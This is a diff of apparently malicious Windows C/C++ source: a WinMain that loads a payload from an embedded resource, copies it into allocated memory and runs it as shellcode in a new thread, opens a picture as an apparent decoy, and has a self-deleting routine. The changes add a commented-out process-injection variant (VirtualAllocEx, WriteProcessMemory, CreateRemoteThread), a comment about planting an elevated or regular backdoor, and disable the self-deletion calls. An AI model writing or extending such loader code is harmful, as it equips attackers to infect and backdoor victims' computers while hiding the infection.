@@ -350,7 +350,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 		resHandle = LoadResource(NULL, res);
 		payload1 = (unsigned char*)LockResource(resHandle);
 		payload1_len = SizeofResource(NULL, res);
-
+		
 		// Allocate some memory buffer for payload
 		exec_mem = VirtualAlloc(0, payload1_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
@@ -367,6 +367,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
 			WaitForSingleObject(th, -1);
 		}
+		
+		/*
+		LPVOID pRemoteCode = NULL;
+		HANDLE hThread = NULL;
+		HANDLE curProc = GetCurrentProcess();
+		pRemoteCode = VirtualAllocEx(curProc, NULL, payload1_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+		WriteProcessMemory(curProc, pRemoteCode, (PVOID)payload1, (SIZE_T)payload1_len, (SIZE_T*)NULL);
+
+		hThread = CreateRemoteThread(curProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
+		if (hThread != NULL) {
+			WaitForSingleObject(hThread, 500);
+			CloseHandle(hThread);
+			return 0;
+		}
+		*/
 
 		//return 0;
 
@@ -419,9 +434,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
 	CloseHandle(ShExecInfo.hProcess);
 
+	//elevate and put elevated backdoor, otherwise, put regular  backdoor.
 
-	deleteSelf((LPCWSTR)picturename.c_str(), payload, payload_len);
-	DeleteFile(lpTempFileName);
+
+	//deleteSelf((LPCWSTR)picturename.c_str(), payload, payload_len);
+
+
+
+	//DeleteFile(lpTempFileName);
 
 	//STARTUPINFO si;
 	//PROCESS_INFORMATION pi;
